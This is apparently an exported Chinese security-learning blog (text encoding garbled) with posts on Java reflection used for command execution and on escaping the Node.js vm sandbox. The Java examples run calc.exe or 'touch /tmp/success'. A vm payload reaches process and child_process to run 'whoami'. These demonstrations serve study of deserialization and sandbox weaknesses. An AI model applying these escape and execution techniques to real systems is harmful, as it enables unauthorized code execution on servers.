//è¿‡ç¨‹åŒä¸Š } }ä¸ºä»€ä¹ˆè¿™é‡Œä¸ç”¨Runtime runtime=new Runtime();æ¥è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚ å‰©ä¸‹çš„æ­¥éª¤çš„å°±ä¸ç”¨å¤šè§£é‡Šäº†ï¼Œé€šè¿‡getClass()æ¥è·å–ç±»å¯¹è±¡ï¼Œä»è€Œç”¨getMethodè·å–æ–¹æ³•ï¼Œåœ¨ç”¨åå°„è¿›è¡Œè°ƒç”¨æ¥æ‰§è¡Œå‘½ä»¤ã€‚ Class.forName()è·å¾—ç±» è¿˜å¯ä»¥ç›´æ¥é€šè¿‡Class.forName()åå°„è·å¾—ç±»ï¼ˆæ ¹æ®ç»™å®šçš„ç±»ååŠ è½½å¹¶è¿”å›å¯¹åº”çš„ Class å¯¹è±¡ï¼‰ï¼Œé€šè¿‡åå°„è°ƒç”¨æ–¹æ³•getRuntimeå¾—åˆ°ç±»çš„å®ä¾‹åŒ–ï¼Œæœ€åè°ƒç”¨execæ–¹æ³•ã€‚ import java.lang.reflect.Method; //å¼•å…¥Methodç±» public class Main{ public static void main(String[] args) throws Exception{ //æŠ›å‡ºå¼‚å¸¸å°±ä¸è¯´äº† Class c=Class.forName(\"java.lang.Runtime\"); //è·å¾—ç±»å¾—classå¯¹è±¡ Method m1= c.getMethod(\"getRuntime\",new Class[]{}); //åˆ©ç”¨getMethodè·å¾—getRuntimeæ–¹æ³• Object runtime=m1.invoke(null); //åˆ©ç”¨åå°„æ¥è°ƒç”¨æ–¹æ³•getRuntime Method m2=c.getMethod(\"exec\",String.class); //åˆ©ç”¨getMethodè·å¾—getRuntimeæ–¹æ³• Object o=m2.invoke(runtime,\"calc.exe\"); //åå°„è°ƒç”¨execæ–¹æ³• } }nullæ˜¯å› ä¸ºgetRuntimeæ˜¯é™æ€æ–¹æ³•ï¼Œé™æ€æ–¹æ³•ä¸ç”¨å®ä¾‹åŒ–çš„å¯¹è±¡å°±èƒ½è°ƒç”¨ã€‚ è¿™æ ·å¯ä»¥è·å¾—Runtimeå¾—å®åˆ—åŒ–å¯¹è±¡åå°±èƒ½è°ƒç”¨execæ–¹æ³•äº†ã€‚ ç®€å†™ä¸€ä¸‹ï¼š public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); } }è¿™æ ·å°±ä¸ç”¨å¼•å…¥Methodç±»äº†ï¼ˆå½“ç„¶è¿™é‡Œè™½ç„¶è·å¾—å®åˆ—åŒ–å¯¹è±¡çš„æ•ˆæœä¸€æ ·ï¼Œè¿˜æ˜¯ç•¥æœ‰åŒºåˆ«çš„ï¼‰è¿™é‡Œçš„å®åˆ—åŒ–ä¸èƒ½ç›´æ¥è°ƒç”¨æ–¹æ³•æœºè¿›è¡Œå‘½ä»¤æ‰§è¡Œruntime.exec(\"calc.exe\"); æƒ³è¦ç›´æ¥è°ƒç”¨æ–¹æ³•è¿˜éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼š public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Runtime run=(Runtime) runtime; run.exec(\"calc.exe\"); } }ä¸Šé¢å†™äº†ä¸¤ç§è·å¾—Classç±»çš„æ–¹æ³•ï¼Œä¸€èˆ¬æ˜¯ä¸‰ç§æ–¹æ³•ï¼š obj.getClass()ï¼šè·å¾—å®ä¾‹åŒ–å¯¹è±¡æ‰€å±ç±»çš„çš„ç±»ã€‚ Class.forNameï¼šçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œç›´æ¥ç”¨forNameæ¥è·å–ã€‚ Test.classï¼šå¦‚æœå·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„java.lang.Classå¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥æ‹¿åˆ°å®ƒçš„Classå±æ€§ã€‚è¿™ä¸ªæ–¹æ³•å…¶å®ä¸å±äºåå°„äº†ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œåå°„ä¸‰è¦ç´ ï¼šç±»çš„å¯¹è±¡(ç±»)ï¼Œç±»çš„å®åˆ—åŒ–å¯¹è±¡ï¼Œæ–¹æ³•ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:2:0","tags":["java"],"title":"javaåå°„æœºåˆ¶","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"è·å¾—ç±»çš„å®åˆ—åŒ–å¯¹è±¡ ä¸€ã€Class.newInstanceè·å– è·å¾—ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ä¸€èˆ¬ä½¿ç”¨Class.newInstanceï¼ˆè™½ç„¶ä¸Šé¢çš„ä¾‹å­æ˜¯ä½¿ç”¨çš„æ˜¯getRuntimeæ–¹æ³•ï¼‰ï¼Œä½†å¾ˆå¤šæƒ…å†µä¸‹ä¼šå¤±è´¥ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•åªèƒ½è°ƒç”¨æ— å‚æ„é€ å‡½æ•°ï¼Œå¯¹äºä¸€äº›ç±»é‡Œé¢æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æˆ–è€…æ˜¯ç§æœ‰å±æ€§çš„æ„é€ æ–¹æ³•å°±ä¼šå¤±è´¥ã€‚ äºŒã€é™æ€æ–¹æ³•è°ƒç”¨ ä¸Šé¢çš„Runtimeç±»å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå®ƒçš„æ— å‚æ„é€ å‡½æ•°å°±æ˜¯ç§æœ‰å±æ€§ï¼Œä½†å®ƒæ˜¯å•åˆ—æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡é™æ€æ–¹æ³•getRuntime()è°ƒç”¨å…¶æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ï¼ˆææˆç§æœ‰å±æ€§åˆ©ç”¨æ–¹æ³•è¿›è¡Œè°ƒç”¨çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢å»ºç«‹å¤šæ¬¡æ•°æ®åº“è¿æ¥ï¼‰ã€‚ ä½†æ˜¯å¯¹äºä¸€äº›äºæ²¡æœ‰é™æ€æ–¹æ³•çš„åˆè¯¥æ€ä¹ˆåŠå‘¢ã€‚ ä¸‰ã€getConstructor()å‡½æ•° å¯¹äºæ²¡æœ‰é™æ€æ–¹æ³•æˆ–è€…æ„é€ å‡½æ•°æœ‰å‚æ—¶å¯ä»¥ç”¨ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³•è¿›è¡Œè·å–ï¼ŒgetConstructor()(æ— å‚æœ‰å‚éƒ½å¯ä»¥è·å–) å’ŒgetMethodç±»ä¼¼ï¼ŒgetConstructorçš„æ¥æ”¶å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼ˆå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼‰ï¼Œè·å–åˆ°æ„é€ å‡½æ•°å†ä½¿ç”¨newInstanceæ¥æ‰§è¡Œå°±å¯ä»¥è·å¾—ç±»çš„å®åˆ—åŒ–å¯¹è±¡ã€‚ ä¾‹å¦‚å¸¸ç”¨çš„å¦ä¸€ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ProcessBuilderï¼Œä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨startæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); //è·å–ç±» Constructor con=c.getConstructor(List.class); //è·å¾—æœ‰å‚æ„é€ å‡½æ•°ï¼Œå¦‚æœè¦è·å¾—æ— å‚å°±ä»€ä¹ˆéƒ½ä¸ç”¨æ·» Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); //è¿›è¡Œå®åˆ—åŒ– ProcessBuilder pro = (ProcessBuilder) obj; //å¼ºåˆ¶ç±»å‹è½¬æ¢ pro.start(); //è°ƒç”¨æ–¹æ³• } }å…¨åå°„è°ƒç”¨: import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(List.class); Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); c.getMethod(\"start\").invoke(obj); //åˆ©ç”¨åå°„è¿›è¡Œæ–¹æ³•è°ƒç”¨ } }è¿›å…¥ProcessBuilderç±»çœ‹è§è¿˜æœ‰ä¸ªæœ‰å‚æ„é€ æ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯ProcessBuilder(String... command)ï¼Œå³å¯å˜é•¿å‚æ•° å¯¹äºå¯å˜é•¿å‚æ•°ï¼Œjavaåœ¨ç¼–è¯‘æ—¶ä¼šç¼–è¯‘ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸‹é¢å†™æ³•åº•å±‚ä¸Šæ˜¯ç­‰æ•ˆçš„ï¼ˆä¸èƒ½é‡è½½ï¼‰ public void m1(String[] names){} public void m1(String... names){}å› æ­¤å¯¹m1å‡½æ•°ä¼ å‚å°±ç›´æ¥ä¼ æ•°ç»„ String[] names={\"hello\",\"world\",\"!!!!\"}; m1(names)ï¼›æ‰€ä»¥è¿˜å¯ä»¥è¿™æ ·æ„é€ ï¼š import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance(new String[][]{{\"calc.exe\"}}); //å› ä¸ºnewInstanceæ¥å—çš„å‚æ•°æ˜¯Object... argsï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥çš„æ˜¯äºŒç»´æ•°ç»„ï¼ŒäºŒç»´æ•°ç»„åœ¨å¤„ç†æ˜¯ä¼šå½“ä½œä¸€ä¸ªæ•´ä½“å¯¹è±¡å¤„ç† c.getMethod(\"start\").invoke(obj); } }æˆ–è€…æŠŠå‚æ•°å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºobjectï¼š import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance((Object) new String[]{\"calc.exe\"}); //å¼ºåˆ¶ç±»å‹è½¬æ¢ c.getMethod(\"start\").invoke(obj); } }æœ‰å‚çš„æ„é€ æ–¹æ³•å¤§æ¦‚å°±æ˜¯è¿™æ ·äº† å½“ç„¶è¿™ä¸ªç±»æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨çš„ï¼š public class Main{ public static void main(String[] args)throws Exception{ ProcessBuilder pro=new ProcessBuilder(\"calc.exe\"); pro.start(); } }å››ã€getDeclaredç³»åˆ— æ„é€ å‡½æ•°ä¸ºç§æœ‰æ–¹æ³•çš„è§£å†³åŠæ³•ï¼š è¿™å°±æ¶‰åŠåˆ°getDeclaredç³»åˆ—çš„åå°„äº†ï¼Œä¸æ™®é€šçš„ getMethod ã€ getConstructor åŒºåˆ«æ˜¯ï¼š getMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³• getDeclaredMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®åœ¨å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº† getDeclaredMethod çš„å…·ä½“ç”¨æ³•å’Œ getMethod ç±»ä¼¼ï¼Œ getDeclaredConstructor çš„å…·ä½“ç”¨æ³•å’Œ getConstructor ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œä¸Šé¢è¯´äº†Runtimeçš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰æ–¹æ³•ï¼Œè¯•ä¸€è¯•ï¼š import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception { Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor constructor = clazz.getDeclaredConstructor(); //è·å–ç§æœ‰çš„æ— å‚æ„é€ å‡½æ•° constructor.setAccessible(true); //ä¿®æ”¹å…¶ä½œç”¨åŸŸï¼Œå¿…é¡»çš„ Object runtime = constructor.newInstance(); //è¿›è¡Œå®ä¾‹åŒ– clazz.getMethod(\"exec\", String.class).invoke(runtime, \"calc.exe\"); //åå°„è°ƒç”¨æ–¹æ³• } }jdk11è™½ç„¶æœ‰å¾ˆå¤šæŠ¥é”™ä½†æ˜¯è¿˜æ˜¯èƒ½æ‰§è¡Œï¼š jdk1.8ï¼ˆjava8ï¼‰å°±èƒ½å®Œç¾æ‰§è¡Œï¼š ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:3:0","tags":["java"],"title":"javaåå°„æœºåˆ¶","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"æ€»ç»“ä¸€ä¸‹ï¼š è·å–Classå¯¹è±¡ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹æ³•Class.forName,obj.getClass,test.class è·å–å®åˆ—åŒ–ç±»ä¸€èˆ¬ç›´æ¥newInstanceï¼Œå¤±è´¥å°±ä¸¤ç§æƒ…å†µè¦ä¹ˆæ˜¯æœ‰å‚æ„é€ å‡½æ•°ï¼Œè¦ä¹ˆå°±æ˜¯ç§æœ‰çš„ã€‚ä¸€èˆ¬æœ‰é™æ€è°ƒç”¨æ–¹æ³•å°±ç›´æ¥ç”¨æ–¹æ³•ï¼Œå¦‚ï¼šgetRuntime,æ²¡æœ‰å°±Constructoré…åˆnewInstanceï¼Œç§æœ‰çš„å°±ç”¨getDeclaredç³»åˆ—çš„åå°„ æœ€åå°±æ˜¯getMethodè·å–æ–¹æ³•ç„¶åinvokeè¿›è¡Œè°ƒç”¨æ–¹æ³•ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:4:0","tags":["java"],"title":"javaåå°„æœºåˆ¶","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"åˆ©ç”¨åå°„ä¸€ä¸ªé‡è¦ç›®çš„å°±æ˜¯ç»•æ²™ç›’æœºåˆ¶ï¼ˆforNameï¼‰ ä¾‹å¦‚ä¸Šä¸‹æ–‡åªæœ‰intgerç±»å‹çš„æ•°å­—ï¼Œæ€ä¹ˆè·å¾—Runtimeç±» 123.getClass().forNmae(\"java.lang.Runtime\"); forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š Class\u003c?\u003e forName(String name) Class\u003c?\u003e forName(String name, **boolean** initialize, ClassLoader loader) ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„è·å–classçš„æ–¹å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬äºŒç§æ–¹å¼çš„ä¸€ä¸ªå°è£…ï¼š Class.forName(String name) //ç­‰äº Class.forName(Stirng name,true,currentLoder)é»˜è®¤æƒ…å†µä¸‹ï¼Œ forName çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°± æ˜¯ ClassLoader ã€‚ ClassLoader æ˜¯ï§½ä¹ˆå‘¢ï¼Ÿå®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½ï¨¸â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚ Javaé»˜è®¤çš„ ClassLoader å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œ è¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´ï¤·å¾„ï¼Œå¦‚ java.lang.Runtime ç°åœ¨æ¥è¯´è¯´ç¬¬äºŒä¸ªå‚æ•°å¯èƒ½é€ æˆçš„æ¼æ´ï¼š ç¬¬äºŒä¸ªå‚æ•°çš„æ„æ€æ˜¯å‘Šè¯‰javaè™šæ‹Ÿæœºæ˜¯å¦æ‰§è¡Œâ€œç±»åˆå§‹åŒ–â€ ä¾‹å­ï¼š public class Main { { System.out.println(\"1block initial\" + this.getClass()); } static { System.out.println(\"2initail\" + Main.class); } public Main() { System.out.println(\"3initial:\" + this.getClass()); } public static void main(String[] args) { Main main = new Main(); } }ç»“æœï¼š å¯ä»¥çœ‹åˆ°é¦–å…ˆè°ƒç”¨çš„æ˜¯static{}ï¼Œç„¶åæ˜¯{}ï¼Œæœ€åæ˜¯æ„é€ å‡½æ•°{} static{}æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€è°ƒç”¨ï¼Œè€Œ{}ä¸­çš„ä»£ç ä¼šåœ¨æ„é€ å‡½æ•°çš„super()åé¢ï¼Œåœ¨å½“å‰æ„é€ å‡½æ•°å‰é¢ æ‰€ä»¥å½“æœ‰å¦‚ä¸‹ä»£ç (nameå¯æ§)ï¼š public void ref(String[] name)throws Exception{ Class.forName(name); }å°±å¯ä»¥æ„é€ ä¸ªstatic{}çš„æ‰§è¡Œä»£ç ï¼Œä¾‹å¦‚ï¼š import java.lang.Runtime; import java.lang.Process; public class TouchFile { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"touch\", \"/tmp/success\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } }é‚£ä¹ˆå°±ä¼šåœ¨åˆå§‹åŒ–ç±»æ—¶æ‰§è¡Œä»£ç ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:5:0","tags":["java"],"title":"javaåå°„æœºåˆ¶","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"å‚è€ƒï¼šhttps://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLcxA2%3D7YRieD\u0026alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6 å‚è€ƒï¼šhttps://www.anquanke.com/post/id/237032#h3-4 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:0:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"åŸºç¡€æ¦‚å¿µ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸€ã€ 1ï¼šJavaScriptå’ŒNodejsä¹‹é—´åŒºåˆ«ï¼šJavaScriptç”¨åœ¨æµè§ˆå™¨å‰ç«¯ï¼Œåæ¥å°†Chromeä¸­çš„v8å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸ºJavaScriptå•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤å†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„JavaScriptå°±å«å«åšNodejsã€‚ **2ï¼š**åœ¨Nodejsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ªvmæ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤Nodeåç»­å‡çº§äº†vmï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„vm2æ²™ç®±ï¼Œvm2å¼•ç”¨äº†vmæ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:1","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"äºŒã€ **nodejsä½œç”¨åŸŸï¼š**è¯´åˆ°ä½œç”¨åŸŸï¼Œæˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹Nodeä¸­çš„ä½œç”¨åŸŸæ˜¯æ€ä¹ˆåˆ†é…çš„ï¼ˆåœ¨Nodeä¸­ä¸€èˆ¬æŠŠä½œç”¨åŸŸå«ä¸Šä¸‹æ–‡ï¼‰ åœ¨JavaScriptä¸­windowæ˜¯å…¨å±€å¯¹è±¡ï¼Œæµè§ˆå™¨å…¶ä»–æ‰€æœ‰çš„å±æ€§éƒ½æŒ‚è½½åœ¨windowä¸‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯çš„Nodejsä¸­å’Œwindowç±»ä¼¼çš„å…¨å±€å¯¹è±¡å«åšglobalï¼ŒNodejsä¸‹å…¶ä»–çš„æ‰€æœ‰å±æ€§å’ŒåŒ…éƒ½æŒ‚è½½åœ¨è¿™ä¸ªglobalå¯¹è±¡ä¸‹ã€‚åœ¨globalä¸‹æŒ‚è½½äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨è®¿é—®è¿™äº›å…¨å±€å˜é‡æ—¶ä¸éœ€è¦ç”¨global.xxxçš„æ–¹å¼æ¥è®¿é—®ï¼Œç›´æ¥ç”¨xxxå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œconsoleå°±æ˜¯æŒ‚è½½åœ¨globalä¸‹çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨ç”¨console.logè¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆglobal.console.logï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:2","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"VMæ²™ç®±é€ƒé€¸ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:0","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"ä¸€ã€ å…³é”®å‡½æ•°ï¼š vm.runinThisContext(code)ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚ vm.createContext([sandbox])ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚ï¼ˆç±»ä¼¼äºæŠŠglobalå˜ä¸ºäº†å…¶ä»–åŒ…ï¼ŒV8å¼•æ“å˜ä¸ºäº†å…¨å±€ï¼‰ vm.runInContext(code, contextifiedSandbox[, options])ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ï¼ˆä½œç”¨åŸŸï¼‰ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚ ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:1","tags":["node.js","æ²™ç®±é€ƒé€¸"],"title":"nodejs VMå’ŒVM2æ²™ç®±é€ƒé€¸","uri":"/posts/nodejs-vm/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"äºŒã€ 1ï¼šä¸€èˆ¬çš„VMæ²™ç®±é€ƒé€¸ å…ˆçœ‹åˆ—å­ï¼š const vm = require('vm'); const script = `m + n`; //åå¼•å·å¯ä»¥æ‰§è¡Œå‘½ä»¤ const sandbox = { m: 1, n: 2 }; //ç»™æ²™ç®±ä¸­ä¼ å…¥å¯¹è±¡ const context = new vm.createContext(sandbox); //åˆ›å»ºæ²™ç®±ä¸Šä¸‹æ–‡ç¯å¢ƒå¹¶å°†æ²™ç®±å¯¹è±¡ä¼ é€’è¿›æ¥ const res = vm.runInContext(script, context); //æ²™ç®±å†…éƒ¨çš„æ‰§è¡Œ console.log(res)æ‰§è¡Œ: è¿™é‡Œå‘½ä»¤æ˜¯ `m+n` ï¼Œç„¶å context æ˜¯æ²™ç®±å†…çš„å¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡æ”¹ä¸º null çš„è¯å‘½ä»¤å°±æ‰§è¡Œä¸äº†äº†ã€‚ è¿™ç§æœ‰å¯¹è±¡çš„éå¸¸å®¹æ˜“ç»•è¿‡ payloadï¼š const cc = this.toString.constructor('return process')() #é€šè¿‡æŒ‡å‘sandboxï¼ˆå…¨å±€ï¼‰çš„thisæ‹¿åˆ°äº†processæ¨¡å—ï¼Œç„¶åé€šè¿‡this.toStringæ‹¿åˆ°äº†toStringå‡½æ•°ï¼Œæœ€åé€šè¿‡constructoræ‹¿åˆ°äº†æ‰€æœ‰å‡½æ•°çš„æ„é€ å‡½æ•°Functionï¼Œç„¶åé€šè¿‡return processæ‹¿åˆ°processæ¨¡å—ã€‚ cc.mainModule.require('child_process').execSync('whoami').toString() #æ‹¿åˆ°processæ¨¡å—åæ‹¿åˆ°å­æ¨¡å—child_processï¼Œæœ€åè°ƒç”¨whoamiå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ã€‚ #execSyncåŒæ­¥æ‰§è¡Œä¼ å…¥ï¼š è¿è¡Œå³å¯æ‰§è¡Œå‘½ä»¤ï¼š å¦‚æœæˆ‘ä»¬å°†thisæ¢æˆmå’Œnä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”è¿™äº›éƒ½æ˜¯primitiveç±»å‹ï¼Œä»–ä»¬åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å°†å€¼ä¼ é€’è¿‡å»è€Œä¸æ˜¯å¼•ç”¨ï¼ˆç±»ä¼¼äºå‡½æ•°ä¼ é€’å½¢å‚ï¼‰ï¼Œåœ¨æ²™ç›’å†…ä½¿ç”¨çš„mnå·²ç»ä¸æ˜¯åŸæ¥çš„mnäº†ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ï¼ˆå¦‚æœæ¢ä¸ºå…¶ä»–ç±»å‹ï¼Œå¦‚å­—å…¸ï¼Œæ•°ç»„å°±å¯ä»¥å¼•ç”¨äº†ï¼‰ã€‚ 